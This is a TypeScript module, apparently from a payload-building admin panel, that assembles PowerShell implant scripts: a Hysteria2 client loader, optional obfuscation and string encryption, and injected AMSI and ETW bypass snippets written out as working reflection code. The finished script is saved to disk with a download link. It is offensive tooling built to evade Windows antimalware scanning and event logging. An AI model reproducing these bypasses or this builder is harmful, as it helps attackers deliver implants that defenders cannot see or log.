/* ------------------------------------------------------------------ */
/*  PowerShell Payload Builder Module                                   */
/* ------------------------------------------------------------------ */

import { writeFile } from "fs/promises"
import { tmpdir } from "os"
import { join } from "path"
import { updatePayloadBuildStatus, updatePayloadBuild } from "@/lib/db/payload-builds"
import { obfuscatePowerShell, generatePowerShellLoader } from "@/lib/payloads/obfuscation/powershell-obfuscation"
import { encryptStrings, generatePowerShellDecryptionStub } from "@/lib/payloads/obfuscation/string-encryption"
import logger from "@/lib/logger"
import type { PayloadConfig } from "@/lib/payloads/generator"

/* ------------------------------------------------------------------ */
/*  Build Step Helper                                                  */
/* ------------------------------------------------------------------ */

async function simulateBuildStep(
  id: string,
  delayMs: number,
  message: string
): Promise<void> {
  await updatePayloadBuildStatus(id, "building", message)
  await new Promise((resolve) => setTimeout(resolve, delayMs))
}

/* ------------------------------------------------------------------ */
/*  AMSI Bypass Generator                                              */
/* ------------------------------------------------------------------ */

function generateAmsiBypass(): string {
  return `# AMSI Bypass
${"$"}Ref = ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'))
${"$"}Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue(${"$"}null,${"$"}true)
`
}

/* ------------------------------------------------------------------ */
/*  ETW Bypass Generator                                               */
/* ------------------------------------------------------------------ */

function generateEtwBypass(): string {
  return `# ETW Bypass
${"$"}Ref = ([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider'))
${"$"}Ref.GetField('etwProvider','NonPublic,Static').SetValue(${"$"}null,${"$"}null)
`
}

/* ------------------------------------------------------------------ */
/*  Public API                                                         */
/* ------------------------------------------------------------------ */

/**
 * Build a PowerShell payload.
 *
 * Generates a Hysteria2 client loader, applies real obfuscation
 * techniques from the existing module, and optionally adds AMSI
 * and ETW bypasses.
 *
 * @param id     - Payload build ID
 * @param config - Payload configuration
 */
export async function buildPowerShell(
  id: string,
  config: PayloadConfig
): Promise<void> {
  await updatePayloadBuildStatus(id, "building", "Generating PowerShell payload...")

  try {
    // Step 1: Create base loader script using the real obfuscation module
    await simulateBuildStep(id, 500, "Creating Hysteria2 client loader...")
    const loaderScript = generatePowerShellLoader(config.hysteriaConfig)

    // Step 2: Encode configuration as base64
    await simulateBuildStep(id, 800, "Encoding configuration as base64...")

    let finalScript = loaderScript

    // Step 3: Apply obfuscation using the real module
    if (config.obfuscation.enabled) {
      await updatePayloadBuildStatus(id, "building", "Applying PowerShell obfuscation techniques...")

      // Apply real obfuscation from the existing module
      const obfuscationResult = await obfuscatePowerShell(finalScript, {
        enabled: true,
        level: config.obfuscation.level,
        techniques: config.obfuscation.techniques,
      })

      finalScript = obfuscationResult.obfuscatedScript

      await updatePayloadBuildStatus(
        id,
        "building",
        `Applied ${obfuscationResult.techniques.length} obfuscation techniques`
      )
      await updatePayloadBuildStatus(
        id,
        "building",
        `Compression ratio: ${obfuscationResult.metadata.compressionRatio.toFixed(2)}x`
      )

      // Apply string encryption if requested
      if (config.obfuscation.techniques.includes("string_encode")) {
        await simulateBuildStep(id, 400, "Applying string encryption...")
        const decryptionStub = generatePowerShellDecryptionStub(
          Buffer.from(Math.random().toString(36)).toString("hex").slice(0, 16)
        )
        finalScript = decryptionStub + "\n" + finalScript
      }
    }

    // Step 4: Add AMSI bypass if enabled
    if (config.obfuscation.techniques.includes("amsi_bypass")) {
      await simulateBuildStep(id, 300, "Injecting AMSI bypass...")
      finalScript = generateAmsiBypass() + finalScript
    }

    // Step 5: Add ETW bypass if enabled
    if (config.obfuscation.techniques.includes("etw_bypass")) {
      await simulateBuildStep(id, 300, "Injecting ETW bypass...")
      finalScript = generateEtwBypass() + finalScript
    }

    // Step 6: Write script to disk
    const outPath = join(tmpdir(), `payload-${id}.ps1`)
    await writeFile(outPath, finalScript, "utf8")
    const artifactSize = Buffer.byteLength(finalScript, "utf8")

    await updatePayloadBuild(id, {
      sizeBytes: artifactSize,
      downloadUrl: `/api/admin/security/payloads/${id}/download`,
      implantBinaryPath: outPath,
    })

    logger.info({ id, sizeBytes: artifactSize, outPath }, "PowerShell payload build: completed")
  } catch (err) {
    const errorMsg = err instanceof Error ? err.message : String(err)
    logger.error({ id, err: errorMsg }, "PowerShell payload build: failed")
    throw err
  }
}
